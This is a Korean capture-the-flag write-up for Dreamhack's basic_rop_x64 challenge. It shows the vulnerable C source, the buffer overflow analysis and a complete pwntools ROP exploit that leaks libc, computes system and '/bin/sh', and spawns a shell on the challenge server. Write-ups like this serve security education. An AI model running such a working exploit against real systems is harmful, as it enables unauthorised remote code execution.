# basic_rop_x64 - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 2
- Provided Files: basic_rop_x64.c, basic_rop_x64(ELF), libc.so.6
- tools: gdb(pwndbg), checksec, ROPgadget 
## Brief Description
이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x64)의 바이너리와 소스 코드가 주어집니다.
Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec --file=basic_rop_x64
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
## Vulnerability
### BOF(Buffer Overflow)
``` c
char buf[0x40] = {};

read(0, buf, 0x400);
```
`buf`의 크기는 0x40인 반면, `read`로 `buf`에서 읽어오는 크기는 0x400로 한참 초과하여 BOF 취약점이 발생한다.  
## Exploit
### Strategy
PIE, 카나리 비활성화와 함께 BOF 취약점이 있는 환경은 ROP 공격을 수행하기에 적합하다. 공격 시나리오는 다음과 같다.  
1. libc  leak
2. system addr
3. "/bin/sh" addr
4. ret2main
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| buf | -0x40 |
### payload
``` python
from pwn import *

p = remote('host1.dreamhack.games', 9568)
context.arch = "amd64"

e = ELF('./basic_rop_x64')
libc = ELF('x64/libc.so.6')
r = ROP(e)

write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']
main = e.symbols['main']

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh_offset = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Exploit
# write(1, read_got, 4) -> libc  leak
payload = b''
payload += b'A' * 0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)
payload += p64(main) # ret2main

p.send(payload)
p.recvuntil(b'A' * 0x40)

# libc 
read = u64(p.recvn(6) + b'\x00'*2)
libc_ = read - read_offset
system = libc_ + system_offset
binsh = libc_ + sh_offset
log.info(f'system: {system}')
log.info(f'sh: {binsh}')

# system("/bin/sh") 
payload = b''
payload += b'A' * 0x48
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

# interactive
p.interactive()
```